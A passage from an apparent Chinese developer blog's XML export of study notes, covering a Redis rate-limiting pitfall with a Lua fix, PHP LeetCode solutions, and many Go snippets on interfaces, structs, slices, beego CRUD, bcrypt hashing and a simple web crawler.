key 过期了，再执行 DECR 命令，会发现 key 的值和过期时间都变为 -1 了。假设在第一句 SETNX 之后第二句 DECR 之前，key 过期了，再执行 DECR 就会先生成一个永不过期值为 0 的 key。之后所有请求的 SETNX 都是 fasle，一直会基于这个永不过期的 key 进行递减，所有的 $leftTokenNum 都小于 0，因此导致所有请求被限流。$key = 'test_redis_key';$redis-&gt;set($key, '3', ['nx', 'px' =&gt; 5]); // key 设置成 5 毫秒过期$left = $redis-&gt;decr($key);if ($left &lt; 0) &#123; // 这里通过状态码来更方便的观察 header('Is-Limited:1', true, 500);&#125; else &#123; header('Is-Limited:0', true, 200);&#125;&gt; eval "return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;" 2 key1 key2 first second1) "key1"2) "key2"3) "first"4) "second" $key = 'test_redis_key1'; $script = &lt;&lt;&lt;LUAlocal max = tonumber(ARGV[1])local interval_milliseconds = tonumber(ARGV[2])local current = tonumber(redis.call('get', KEYS[1]) or 0)if (current + 1 &gt; max) then return trueelse redis.call('incrby', KEYS[1], 1) if (current == 0) then redis.call('pexpire', KEYS[1], interval_milliseconds) end return falseendLUA; $redis-&gt;script('load', $script); $isLimited = $redis-&gt;eval($script, [$key, 1, 5], 1); // key 5 毫秒过期 if ($isLimited) &#123; header('Is-Limited:1', true, 500); &#125; else &#123; header('Is-Limited:0', true, 200); &#125; Redis 中 DECR 一个不存在的 key 会先把 key 值设置为 0 , TTL 设置为 -1 (永不过期)，再进行减 1 操作。 使用 SETNX 配合 DECR 实现限流，会出现 key 永不过期情况。过期时间比较小或者高并发情况下，发生概率更高。 在 Redis 中执行 Lua 脚本是原子操作。 可以通过 Redis + Lua 实现高并发下的限流。https://learnku.com/articles/39265 Redis 使用手册 PHP 代码实现 Redis 中 Keys 与 Scan 的使用 Redis 命令大全 Redis 命令行工具的妙用 redis过期数据存储方式以及删除方式 redis超时问题排查 分布式和redis Redis 主从复制详细解读 从缓存穿透聊到布隆过滤器 基于redis的秒杀 Redis 为什么使用单进程单线程方式也这么快 面试时你可能需要的 Redis 知识技巧 Redis 一站式管理平台工具ngbdf/redis-manager Kafka学习之路 redis限流 Redis &amp; 常用用法详情 Redis 应用-分布式锁 命令行的 Redis Redis 简单入门 50道Redis面试题史上最全 MYSQL性能优化学习笔记-(1)数据库设计 Redis In Action 笔记 redis缓存雪崩、缓存穿透、缓存更新了解多少？github.com/ZhongFuCheng3y/3y Redis 基础学习 Redis bitmap 在微擎内做公众号的签到活动 Redis In Action 笔记 使用缓存的正确姿势 Redis问题汇总 Redis 的第 n 次涉及 epoll 的本质是什么]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leetcode 题解]]></title>
    <url>%2F2019%2F03%2F19%2Fleetcode-%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Two Sum1234567891011121314151617181920212223242526272829303132333435给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。给定 nums = [2, 7, 11, 15], target = 9因为 nums[0] + nums[1] = 2 + 7 = 9所以返回 [0, 1]function twoSum($nums, $target) &#123; if (!isset($nums[1])) return; foreach ($nums as $key =&gt; $num) &#123; unset($nums[$key]); $result = array_search($target - $num, $nums); if ($result !== false) return [$key, $result]; &#125; &#125;class Solution &#123; /** * @param String $J * @param String $S * @return Integer https://learnku.com/articles/27545 */ function numJewelsInStones($j, $s) &#123; $jArr = str_split($j); $sArr = str_split($s); $i = 0; foreach($sArr as $sItem)&#123; if(in_array($sItem, $jArr))&#123; $i++; &#125; &#125; return $i; &#125;&#125; 在常数时间内检索到最小元素的栈12345678910111213141516171819202122232425262728293031323334353637383940414243444546class MinStack&#123; protected $stack; /** * initialize your data structure here. */ function __construct() &#123; $this-&gt;stack = []; &#125; /** * @param Integer $x * @return NULL */ function push($x) &#123; $this-&gt;stack[] = $x; &#125; /** * @return NULL */ function pop() &#123; array_pop($this-&gt;stack); &#125; /** * @return Integer */ function top() &#123; return end($this-&gt;stack); &#125; /** * @return Integer */ function getMin() &#123; return min($this-&gt;stack); &#125;&#125; Reverse Integer12345678910111213输入: 123输出: 321function reverse($x) &#123; $result = 0; while (abs($x) &gt; 9) &#123; $num = $x % 10; $x = (int)($x / 10); $result = $result * 10 + $num; &#125; $result = $result * 10 + $x; if (strlen(base_convert($result, 10, 2)) &gt; 31) return 0; return $result; &#125; 回文数12345678910111213141516输入: 121输出: true输入: -123输出: false function isPalindrome($x) &#123; if ($x &lt; 0) return false; if ($x % 10 === 0 &amp;&amp; $x != 0) return false; $reverse = 0; while ($x &gt; $reverse) &#123; $reverse = (int)($reverse * 10 + $x % 10); $x = (int)($x / 10); &#125; return $x === $reverse || $x === (int)($reverse / 10); &#125; Remove Linked List Elements1234567891011121314151617181920/** * @param ListNode $head * @param Integer $val * @return ListNode */ function removeElements($head, $val) &#123; if(!$head)&#123; return null; &#125; $data=$head; while($data-&gt;next)&#123; if($data-&gt;next-&gt;val==$val)&#123; $data-&gt;next=$data-&gt;next-&gt;next; &#125;else&#123; $data=$data-&gt;next; &#125; &#125; return $head-&gt;val==$val?$head-&gt;next:$head; &#125;&#125; CTF 相关的内容 ctf 挑战 LeetCode 算法题 1. Two Sum Leetcode基础刷题之PHP解析(112. Path Sum) 尝试 Leetcode https://github.com/icecho/leetcode Leetcode之PHP版题目解析 leetcode中国 科学上网 挑战用 PHP 在 LeetCode 刷算法题 ARTS 挑战 LEETCODE 编程训练 PHP 开始 leetcode 刷题时光 Leetcode 二叉树题目集合 Leetcode 全套题解]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang 学习笔记]]></title>
    <url>%2F2019%2F03%2F18%2Fgolang-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[interface 接口12345678910111213141516171819202122232425262728293031323334353637//https://learnku.com/articles/25488type Pet interface &#123; SetName(name string) Name() string Category() string&#125;type Dog struct &#123; name string&#125;func (dog *Dog) SetName(name string) &#123; dog.name = name&#125;func (dog Dog) Name() string &#123; return dog.name&#125;func (dog Dog) Category() string &#123; return "dog"&#125;func TestDog(t *testing.T) &#123; dog := Dog&#123;"little pig"&#125; _, ok := interface&#123;&#125;(dog).(Pet) fmt.Printf("Dog implements interface Pet: %v\n", ok) // Dog implements interface Pet: false _, ok = interface&#123;&#125;(&amp;dog).(Pet) fmt.Printf("*Dog implements interface Pet: %v\n", ok) // *Dog implements interface Pet: true var pet Pet = &amp;dog fmt.Printf("This pet is a %s, the name is %q.\n", pet.Category(), pet.Name()) // This pet is a dog, the name is "little pig". dog.SetName("monster") fmt.Printf("This pet is a %s, the name is %q.\n", pet.Category(), pet.Name()) // This pet is a dog, the name is "monster".&#125; Go 陷阱之 for 循环迭代变量1234567891011121314151617181920212223242526272829303132333435363738var slice []func()//https://learnku.com/articles/26861func main() &#123; sli := []int&#123;1, 2, 3, 4, 5&#125; for _, v := range sli &#123; fmt.Println(&amp;v) slice = append(slice, func()&#123; fmt.Println(v * v) // 直接打印结果 &#125;) &#125; for _, val := range slice &#123; val() &#125;&#125;// 输出 25 25 25 25 25var slice []func()func main() &#123; sli := []int&#123;1, 2, 3, 4, 5&#125; for _, v := range sli &#123; temp := v // 其实很简单 引入一个临时局部变量就可以了，这样就可以将每次的值存储到该变量地址上 fmt.Println(&amp;temp) // 这里内存地址是不同的 slice = append(slice, func()&#123; fmt.Println(temp * temp) // 直接打印结果 &#125;) &#125; for _, val := range slice &#123; val() &#125;&#125;// 输出 1, 4, 9, 16, 25 预期结果for i, v := rangei, v 都是只创建一次，然后循环中赋值。另外，循环的数组或 Map，是在开始前的镜像，循环中添加或移除元素不改变其循环次数。关于循环还可以引申的是 Map 时是无序的 Struct 与 面向对象1234567891011121314151617181920212223242526272829303132333435363738394041type Human struct &#123; name string age int&#125;var tom Human// 通过赋值初始化 https://learnku.com/articles/25094tom.name, tom.age = "Tom", 18// 详细初始化jerry := Human&#123;age:25, name:"Jerry"&#125;// 按照结构体声明顺序peter := Human&#123;"Peter", 34&#125;// 通过 . 访问fmt.Printf("%s is %d old\n", tom.name, tom.age)type Staff struct &#123; Human // 隐式的引入 Human 的字段 wage int age float32 // 覆盖 Human 的 age&#125;tom := Staff&#123;Human&#123;"Tom", 18&#125;, 1000, 18.5&#125;jerr := Staff&#123;Human:Human&#123;age:32, name:"Jerr"&#125;, wage: 2000, age: 32.5&#125;fmt.Printf("%s is %f old，%d years, wage is %d", tom.name, tom.Human.age, tom.age, tom.wage)fmt.Printf("%s is %f old，%d years, wage is %d", jerr.name, jerr.Human.age, jerr.age, jerr.wage)type Human struct &#123; name string age int&#125;type Employee struct &#123; Human wage int&#125;func (h *Human) Say() &#123; fmt.Printf("Hi, I am %s, My age is %d", h.name, h.age)&#125;// Employee 重写 Sayfunc (e *Employee) Say() &#123; fmt.Printf("Hi, I am %s, %d old year, wage is %d per mothn", e.name, e.age, e.wage)&#125; 异常处理12345678910111213func TestPanic(t *testing.T) &#123; defer func() &#123; fmt.Println("最后结果依旧执行!") // 这一部分的代码依旧执行 &#125;() fmt.Println("执行开始") panic(errors.New("错误信息!"))&#125;// 输出大致结果如下开始最后结果依旧执行!--- FAIL: TestPanic (0.00s)panic: 错误信息! [recovered]panic: 错误信息! rand.Intn () 生成的是伪随机数12345678910111213rand.Intn() 函数是个伪随机函数, 不管运行多少次都只会返回同样的随机数, 因为它默认的资源就是单一值, 所以必须调用 rand.Seed(), 并且传入一个变化的值作为参数, 如 time.Now().UnixNano() , 就是可以生成时刻变化的值.package mainimport ("fmt" "math/rand" "time")func main() &#123; // 初始化随机数的资源库, 如果不执行这行, 不管运行多少次都返回同样的值https://learnku.com/articles/26011 rand.Seed(time.Now().UnixNano()) fmt.Println("A number from 1-100", rand.Intn(81))&#125; beego 框架 model curd123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143定义要连接的数据库 main.go https://learnku.com/articles/26029#topnavpackage mainimport ( _ "newgo/routers" "github.com/astaxie/beego" "github.com/astaxie/beego/orm" _ "github.com/go-sql-driver/mysql")func init() &#123; orm.RegisterDriver("mysql", orm.DRMySQL) orm.RegisterDataBase("default", "mysql", "root:root@tcp(127.0.0.1:3306)/go?charset=utf8")&#125;func main() &#123; beego.Run()&#125;定义路由 router.gobeego.Router("/type", &amp;controllers.ClassifyController&#123;&#125;, "GET:Type")beego.Router("/classifyinsert", &amp;controllers.ClassifyController&#123;&#125;, "POST:ClassifyInsert")beego.Router("/classifyupdate", &amp;controllers.ClassifyController&#123;&#125;, "GET:ClassifyUpdate")beego.Router("/classifysave", &amp;controllers.ClassifyController&#123;&#125;, "POST:ClassifySave")beego.Router("/classifydel", &amp;controllers.ClassifyController&#123;&#125;, "GET:ClassifyDel")model书写package modelsimport ( "github.com/astaxie/beego/orm")type Classify struct &#123; Id int Name string Content string&#125;func init() &#123; orm.RegisterModel(new(Classify))&#125;//增加操作func InsertClassify(name string, content string) (int64, error) &#123; o := orm.NewOrm() var clasinfo Classify clasinfo.Name = name clasinfo.Content = content id, err := o.Insert(&amp;clasinfo) return id, err&#125;//删除操作func ClassifyDel(id int) ([]Classify, int64, error) &#123; o := orm.NewOrm() var lists []Classify num, err := o.QueryTable("classify").Filter("Id", id).Delete() o.QueryTable("inventory").Filter("Cid", id).Delete() return lists, num, err&#125;//展示func ClassifyList() ([]Classify, int64, error) &#123; o := orm.NewOrm() var lists []Classify num, err := o.QueryTable("classify").All(&amp;lists) return lists, num, err&#125;//修改func ClassifyUpdate(id int, name string, content string) ([]Classify, int64, error) &#123; o := orm.NewOrm() var lists []Classify num, err := o.QueryTable("classify").Filter("Id", id).Update(orm.Params&#123; "name": name, "content": content, &#125;) return lists, num, err&#125;控制器package controllersimport ( "fmt" "newgo/models" "strings" "github.com/astaxie/beego/orm" "github.com/astaxie/beego")type ClassifyController struct &#123; beego.Controller&#125;func (c *ClassifyController) Get() &#123; c.TplName = "index.html"&#125;func (c *ClassifyController) Type() &#123; list, num, err := models.ClassifyList() if err == nil &#123; fmt.Println(list) fmt.Println(num) &#125; c.Data["comment"] = list fmt.Println(list) c.TplName = "type.html"&#125;//添加postfunc (c *ClassifyController) ClassifyInsert() &#123; content := strings.TrimSpace(c.GetString("content")) name := strings.TrimSpace(c.GetString("name")) models.InsertClassify(name, content) c.Ctx.Redirect(302, "/type")&#125;//修改get展示func (c *ClassifyController) ClassifySave() &#123; id, _ := c.GetInt("id") fmt.Println(id) content := strings.TrimSpace(c.GetString("content")) name := strings.TrimSpace(c.GetString("name")) models.ClassifyUpdate(id, name, content) c.Ctx.Redirect(302, "/type")&#125;//删除func (c *ClassifyController) ClassifyDel() &#123; id, _ := c.GetInt("id") models.ClassifyDel(id) c.Ctx.WriteString("200")&#125;//修改post方法func (c *ClassifyController) ClassifyUpdate() &#123; id, _ := c.GetInt("id") o := orm.NewOrm() type Comment struct &#123; Id int Name string Content string &#125; var comments []Comment var com []Comment num, err := o.Raw("select * from classify where id=?", id).QueryRows(&amp;comments) o.Raw("select * from classify").QueryRows(&amp;com) if err == nil &#123; fmt.Println(num) fmt.Println(comments) fmt.Println(com) c.Data["updates"] = comments c.Data["comment"] = com &#125; else &#123; fmt.Println("查询报错") &#125; c.TplName = "type.html"&#125; php go的类12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace App;class Animal&#123; public $name; public $height; public $weight; public function __construct($name, $height, $weight) &#123; $this-&gt;name = $name; $this-&gt;height = $height; $this-&gt;weight = $weight; &#125; public function getInfo() &#123; return [ 'name' =&gt; $this-&gt;name, 'height' =&gt; $this-&gt;height, 'weight' =&gt; $this-&gt;weight, ]; &#125;&#125;//https://learnku.com/articles/26056package maintype Animal struct &#123; Name string Height uint Weight uint&#125;func NewAnimal(name string, height, weight uint) Animal &#123; return Animal&#123; Name: name, Height: height, Weight: weight, &#125;&#125;func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123; return map[string]interface&#123;&#125;&#123; "name": a.Name, "height": a.Height, "weight": a.Weight, &#125;&#125; Go for PHP Developers: Structs vs Classes12345678910111213141516171819202122232425262728293031323334353637package maintype Animal struct &#123; Name string Height uint Weight uint&#125;func NewAnimal(name string, height, weight uint) Animal &#123; return Animal&#123; Name: name, Height: height, Weight: weight, &#125;&#125;//https://learnku.com/articles/26056#reply85350 定义不同类似的结构体func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123; return map[string]interface&#123;&#125;&#123; "name": a.Name, "height": a.Height, "weight": a.Weight, &#125;&#125;package maintype AnimalContract interface &#123; GetInfo() map[string]interface&#123;&#125;&#125;type Animal struct &#123; // Struct def...&#125;func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123; // Method body... 继承AnimalContract 如果我们定义一个定义该接口的结构，它将隐式继承它。&#125;package mainimport "fmt"func main()&#123; var array = [9]interface&#123;&#125;&#123;1,3,4,6,7,8,9,10,"index"&#125; fmt.Print(array)&#125; append 扩容1234567891011121314151617package arrayimport ( "fmt")/** * arr 底层扩容知识点https://learnku.com/articles/27630#topnav */func ArrayAppend() []int &#123; arr := make([]int,5) fmt.Printf("arr.len: %d; arr.cap: %d \n", len(arr),cap(arr)) arr = append(arr,10) //问现在 arr 结果是什么 fmt.Printf("arr.len: %d; arr.cap: %d \n", len(arr),cap(arr)) return arr&#125; go build123456789101112131415工作区是 Go 便捷管理项目的方式。一言以蔽之，它就是你系统上的一个目录，Go 可以在此 查找源码 文件，管理依赖包 还有 分发二进制文件。 当 Go 程序命中 import 语句，它就会去 Go 标准库 (*$GOROOT/src*) 中寻找响应的包。如果没找到，然后 Go 就会引用环境变量 GOPATH ，它是 Go 工作区目录的路径，然后再去 $GOPATH/src 目录下寻找这个包。你可以按需指定多个工作区，只要你保证 GOPATH 环境变量指向你的工作区目录即可。一个 Go 工作区目录必须有三个子目录也就是: src, pkg and binsrc 目录包含 Package. Package 包括一个包含 Go 源代码 (*.go* files) 。 任何使用 'go get' 命令安装的包也将驻留在这里 (及其依赖包)。在 Go 中，每个程序都包含在一个包中。 因此，无论何时您将使用新的 Go 项目，您都需要在 $GOPATH/src 中创建新目录并向上工作。当执行 go run hello.go 命令时，Go 编译器会首先编译 hello.go 文件，然后执行里面的二进制代码。Go 程序支持输出二进制文件，执行 go build &lt;package-name&gt; (main 包) 或 go build program/path.go 命令即可在当前文件夹创建二进制文件。执行 go install 命令就可以创建这些文件。 go install 命令会触发底层的 go build 命令，然后将这些文件保存到 bin 目录中。通常情况下，这个目录是在系统的可执行路径中。因此，这个目录中的所有文件都是可以通过终端来操作的。https://learnku.com/golang/t/26863go run main.go go build main.gogo install test #main.go在test目录 for 循环迭代变量123456789101112131415161718192021222324252627282930313233var slice []func()func main() &#123; sli := []int&#123;1, 2, 3, 4, 5&#125; for _, v := range sli &#123; fmt.Println(&amp;v) slice = append(slice, func()&#123; fmt.Println(v * v) // 直接打印结果 &#125;) &#125; //v 在 for 循环引进的一个块作用域内进行声明。在循环里创建的所有函数变量共享相同的变量，就是一个可访问的存储位置，而不是固定的值。(你会惊奇的发现 &amp;v 的内存地址是一样的)https://www.njphper.com/posts/974e86a6.html for _, val := range slice &#123; val() &#125;&#125;// 输出 25 25 25 25 25var slice []func()func main() &#123; sli := []int&#123;1, 2, 3, 4, 5&#125; for _, v := range sli &#123; temp := v // 其实很简单 引入一个临时局部变量就可以了，这样就可以将每次的值存储到该变量地址上 fmt.Println(&amp;temp) // 这里内存地址是不同的 slice = append(slice, func()&#123; fmt.Println(temp * temp) // 直接打印结果 &#125;) &#125; for _, val := range slice &#123; val() &#125;&#125;// 输出 1, 4, 9, 16, 25 预期结果 实现 PHP 的密码加密解密12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package main#https://www.njphper.com/posts/f3f0ab9c.htmlimport ( "fmt" "log" "golang.org/x/crypto/bcrypt")func main() &#123; for &#123; // 输入密码 获取 hash 值 pwd := getPwd() hash := hashAndSalt(pwd) // 再次输入密码验证 pwd2 := getPwd() pwdMatch := comparePasswords(hash, pwd2) fmt.Println("Passwords Match?", pwd) &#125;&#125;func getPwd() []byte &#123; fmt.Println("Enter a password") var pwd string _, err := fmt.Scan(&amp;pwd) if err != nil &#123; log.Println(err) &#125; return []byte(pwd)&#125;func hashAndSalt(pwd []byte) string &#123; hash, err := bcrypt.GenerateFromPassword(pwd, bcrypt.MinCost) if err != nil &#123; log.Println(err) &#125; return string(hash)&#125;func comparePasswords(hashedPwd string, plainPwd []byte) bool &#123; byteHash := []byte(hashedPwd) err := bcrypt.CompareHashAndPassword(byteHash, plainPwd) if err != nil &#123; log.Println(err) return false &#125; return true&#125;str := `&#123;"page": 1, "fruits": ["apple", "peach"]&#125;`实例化了一个 json 字符串，fruits 对应的是一个数组。在 Go 语言中，字符串字面量可以使用双引号 "" 或者反引号 ' 来创建 截取中文123456789101112131415161718first := "fisrt"fmt.Println([]rune(first))fmt.Println([]byte(first))[]rune(s), 它可以将字符串转化成 unicode 码点byte 表示一个字节，rune 表示四个字节first := "社区"fmt.Println([]rune(first))fmt.Println([]byte(first))[31038 21306] //输出结果[]rune[231 164 190 229 140 186]//输出结果[]bytes := "截取中文"//试试这样能不能截取?fmt.Println(s[:2])s := "截取中文"//试试这样能不能截取? https://www.njphper.com/posts/c251fcd3.htmlres := []rune(s)fmt.Println(string(res[:2])) 动态规划1234567891011121314151617181920硬币问题：如果我们有面值为1元、3元和5元的硬币若干枚，如何用最少的硬币凑够11元？https://blog.mutoe.com/2019/dynamic-programming/// CoinChange: coins 硬币, amount 期望的金额, 返回最少需要的硬币数量，如果不可解返回-1func CoinChange(coins []int, amount int) int &#123; dp := make([]int, amount+1) dp[0] = 0 for i := 1; i &lt;= amount; i++ &#123; dp[i] = amount + 1 for _, coin := range coins &#123; if coin &lt;= i &amp;&amp; dp[i-coin] != -1 &amp;&amp; dp[i-coin]+1 &lt; dp[i] &#123; dp[i] = dp[i-coin] + 1 &#125; &#125; if dp[i] &gt; amount &#123; dp[i] = -1 &#125; &#125; return dp[amount]&#125; go php 对比学习12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061https://learnku.com/golang/t/23385/from-a-php-engineers-point-of-view-gofirst, second = second, firstfunc getName() (string, string) &#123; return "hello", "world"&#125;first, last = getName()// foreach ($bookings as $key =&gt; $booking) &#123;&#125;for key, booking := range bookings &#123;&#125;// for ($i = 0; $i &lt; count($bookings); $i++) &#123;&#125;for i := 0; i &lt; len(bookings); i++ &#123;&#125;// while ($i &lt; count($bookings)) &#123;&#125;for i &lt; len(bookings) &#123;&#125;// do &#123;&#125; while (true);for &#123;&#125;type rect struct &#123; // 定义一个结构体 width int height int&#125;func (r *rect) area() int &#123; // 在结构体上添加方法 return r.width * r.height&#125;r := rect&#123;width: 10, height: 15&#125; // 初始化fmt.Print(r.area())type Employee struct &#123; Name string Job Job&#125;type Job struct &#123; Employer string Position string&#125;// 并去结构化它e := Employee&#123; Name: "Sobit", Job: &#123; Employer: "GetYourGuide", Position: "Software Engineer", &#125;,&#125;func heartbeat() &#123; for &#123; time.Sleep(time.Second) fmt.Println("I'm still running...") &#125; &#125; 现在， 我们怎样才能让这个函数在后台执行并且允许我们并行的做其他事呢？ 答案比你想象中要简单， 只需要在执行函数前加一个 go : go heartbeat() // 继续做其他事 Go 自带开箱即用关注代码风格的 go fmt 工具。 不再需要分享 IDE 的配置文件， 不用尝试记住大括号应该是在同一行还是再起一行。 可以使用 go doc 去阅读源码包文档， 而 go vet 将会协助我们查找代码中的问题。 安装第三方包只需要执行 go get [github.com/[vendor]/[package](http://github.com/[vendor]/[package)] 指令， 测试只需要执行 go test [package] 指令。 用Golang写爬虫1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package mainimport ( "fmt" "io/ioutil" "net/http")func main() &#123; fmt.Println("Hello, world") url := "http://www.baidu.com/" download(url)&#125;func download(url string) &#123; client := &amp;http.Client&#123;&#125; req, _ := http.NewRequest("GET", url, nil) // 自定义Header req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)") resp, err := client.Do(req) if err != nil &#123; fmt.Println("http get error", err) return &#125; //函数结束后关闭相关链接https://zhangslob.github.io/2019/01/16/Golang%E5%86%99%E7%88%AC%E8%99%AB/ defer resp.Body.Close() body, err := ioutil.ReadAll(resp.Body) if err != nil &#123; fmt.Println("read error", err) return &#125; fmt.Println(string(body))&#125;package mainimport ( "fmt" "github.com/jackdanger/collectlinks" "net/http")func main() &#123; fmt.Println("Hello, world") url := "http://www.baidu.com/" download(url)&#125;func download(url string) &#123; client := &amp;http.Client&#123;&#125; req, _ := http.NewRequest("GET", url, nil) // 自定义Header req.Header.Set("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)") resp, err := client.Do(req) if err != nil &#123; fmt.Println("http get error", err) return &#125; //函数结束后关闭相关链接 defer resp.Body.Close() links := collectlinks.All(resp.Body) for _, link := range links &#123; fmt.Println("parse url", link) &#125;&#125; go 实现一个简单的 mvc123456git clone https://github.com/jc91715/go-simple-mvcgo get github.com/astaxie/beegogo get github.com/go-sql-driver/mysqlgo run main.gohttps://learnku.com/articles/29546 时间戳操作大全123456789101112dateTime := time.Now()fmt.Println(dateTime)year := time.Now().Year() //年fmt.Println(year)month := time.Now().Month() //月fmt.Println(month)fmt.Println(time.Now().Format("2006-01-02 15:04:05"))t := time.Date(2014, 1, 7, 5, 50, 4, 0, time.Local).Unix()https://learnku.com/golang/t/30925 request12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package httpimport ( "fmt" "github.com/imroc/req" logger "xxx" //logger日志封装 util "xxxx/sdk-utils")type method stringconst ( GET method = "GET" POST method = "POST" PUT method = "PUT" PATCH method = "PATCH" DELETE method = "DELETE")type Response struct &#123; Data []byte&#125;//反序列化操作func (r *Response) Deserialize(object interface&#123;&#125;) (err error) &#123; err = util.JSONUnmarshal(r.Data, object) return err&#125;//支持所有类型请求.func Request(method method, url string, v ...interface&#123;&#125;) (response *Response, err error) &#123; var r *req.Resp response = new(Response) switch method &#123; case "GET": r, err = req.Get(url, v...) case "POST": r, err = req.Post(url, v...) case "PUT": r, err = req.Put(url, v...) case "PATCH": r, err = req.Patch(url, v...) case "DELETE": r, err = req.Delete(url, v...) &#125; if err != nil &#123; return &#125; statusCode := r.Response().StatusCode if statusCode != 200 &#123; err = fmt.Errorf("http cilent code err: %d", statusCode) return &#125; response.Data = r.Bytes() return&#125;https://learnku.com/articles/30935 golang代理12export GO111MODULE=onexport GOPROXY=https://goproxy.io 递归打印杨辉三角12345678910111213141516171819202122232425262728293031package mainimport "fmt"func main() &#123; YangHuiTriangle(10)&#125;//https://learnku.com/articles/31290func YangHuiTriangle(n int) []int &#123; i := n - 1 line := make([]int, n) if i &lt;= 0 &#123; line = []int&#123;1&#125; fmt.Println(line) return line &#125; down := YangHuiTriangle(i) for x := 0; x &lt; n; x++ &#123; if x == 0 &#123; line[0] = 1 continue &#125; if x == n-1 &#123; line[x] = 1 continue &#125; line[x] = down[x-1] + down[x] &#125; fmt.Println(line) return line&#125; JSON 解析12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package mainimport ( "fmt" "encoding/json" "time")func main() &#123; type Fruit struct &#123; Name string `json:"Name"` PriceTag string `json:"PriceTag"` &#125; type FruitBasket struct &#123; Name string Fruit map[string]Fruit Id int64 `json:"ref"`// 声明对应的json key Created time.Time &#125; jsonData := []byte(` &#123; "Name": "Standard", "Fruit" : &#123; "1": &#123; "Name": "Apple", "PriceTag": "$1" &#125;, "2": &#123; "Name": "Pear", "PriceTag": "$1.5" &#125; &#125;, "ref": 999, "Created": "2018-04-09T23:00:00Z" &#125;`) var basket FruitBasket err := json.Unmarshal(jsonData, &amp;basket) if err != nil &#123; fmt.Println(err) &#125; for _, item := range basket.Fruit &#123; fmt.Println(item.Name, item.PriceTag) &#125;&#125;//https://learnku.com/articles/31320 go 的切片12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455对于 go 语言的数组，copy 和 view 是同时都存在的。copy 就是使用这个数组的时候我将这个数组拷贝一份，这样对于数组的增删改，是不会改变原数组的值的view 由数组执行切片所返回的对象是一个 view，即视图，若我们在视图上操作数组，会改变原数组，copy 场景package mainimport ( "fmt")func updateArr(arr [5]int) &#123; arr[0] = 100 fmt.Println("修改后的arr：", arr)&#125;func main() &#123; arr3 := [...]int&#123;2, 4, 5, 6, 7&#125; fmt.Println("原来的：", arr3) updateArr(arr3) fmt.Println("再次查看原始的：", arr3)&#125;输出结果：原来的： [2 4 5 6 7]修改后的arr： [100 4 5 6 7]再次查看原始的： [2 4 5 6 7]如上代码可以看到，我们在 updateArr 里面修改了下标为 0 的值，但是我们输出原始数组的时候，并没有变。这就是对数组 copy。view 场景func updateArr(arr []int) &#123; arr[0] = 100 fmt.Println("修改后的arr：", arr)&#125;func main() &#123; arr3 := [...]int&#123;2, 4, 5, 6, 7&#125; fmt.Println("原来的：", arr3) // 使用切片 updateArr(arr3[:]) fmt.Println("再次查看原始的：", arr3)&#125;输出结果：原来的： [2 4 5 6 7]修改后的arr： [100 4 5 6 7]再次查看原始的： [100 4 5 6 7]为什么 view 能够改变原数组虽然 Slice 本身是值类型，但是它内部使用了对数组的指针引用，所以修改切片数据，会将数组原有数据修改掉。当然，在理解上面的同时，一定要知道 go 是如何定义一个切片的var b []int所以，在 updateArr 这个函数传参的时候 arr []int 是传切片进去。不然会报错 https://learnku.com/articles/32171 结构体的值传递和引用传递1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253值传递type person struct &#123; name string age int gender string&#125;// 方法定义func (p person) setName(name string) &#123; p.name = name fmt.Println("person name is:", p.name)&#125;func (p *person) describe() &#123; fmt.Printf("我叫 %v, 我今年 %v 了", p.name, p.age)&#125;func main() &#123; p := person&#123;"Tom", 22, "man"&#125; // 修改name的值 p.setName("jury") p.describe()&#125;如上，我们在 setName 这个函数的接受者 是 p person。 此时，就相当于把 person&#123;"Tom", 22, "man"&#125; 拷贝一份传递过去。引用传递引用传递就是将该值在内存中的存储地址传递过去。type person struct &#123; name string age int gender string&#125;// 方法定义func (p *person) setName(name string) &#123; p.name = name fmt.Println("person name is:", p.name)&#125;func (p *person) describe() &#123; fmt.Printf("我叫 %v, 我今年 %v 了", p.name, p.age)&#125;func main() &#123; p := person&#123;"Tom", 22, "man"&#125; // 修改name的值 p.setName("jury") p.describe()&#125;我们在 setName 这个函数的接受者 是 p *person。 此时，就相当于把 person&#123;"Tom", 22, "man"&#125; 存储地址传递过去。https://learnku.com/articles/32233 实现继承123456789101112131415161718192021222324252627282930313233343536373839404142434445package mainimport ( "fmt" "strconv")// 动物类type Animal struct &#123; name string subject string&#125;// 动物的公共方法func (a *Animal) eat(food string) &#123; fmt.Println(a.name + "喜欢吃：" + food +",它属于:" + a.subject)&#125;// 猫类，继承动物类https://learnku.com/articles/32295#reply102908type Cat struct &#123; // 继承动物的属性和方法 Animal // 猫自己的属性 age int&#125;// 猫类独有的方法 type name struct&#123;&#125; 结构体 就相当于其他语言中的 class 类的概念。func (c Cat) sleep() &#123; fmt.Println(c.name + " 今年" + strconv.Itoa(c.age) + "岁了,特别喜欢睡觉")# go 语言中，string + int，如果想要一个字符串，则需要对 int 类型的值转换为 string 类型，然后才能拼接。&#125;func main() &#123; // 创建一个动物类 animal := Animal&#123;name:"动物", subject:"动物科"&#125; animal.eat("肉") // 创建一个猫类 cat := Cat&#123;Animal: 